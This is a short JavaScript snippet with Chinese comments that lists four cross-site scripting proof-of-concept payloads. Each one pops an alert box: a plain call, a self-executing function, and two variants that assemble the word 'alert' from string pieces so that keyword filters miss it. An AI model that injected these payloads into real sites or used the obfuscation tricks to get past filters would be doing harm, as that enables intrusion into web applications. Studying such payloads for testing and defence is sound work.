// 1. 一般 alert
alert('XSS 成功！');

// 2. 自我執行
(function(){
  alert('✅ 自我執行的 XSS！');
})();

// 3. 混淆呼叫
(window['al'+'ert'])('✅ 混淆版 XSS！');

// 4. 變數呼叫
var x = 'al' + 'ert';
window[x]('✅ 變數混淆 XSS！');
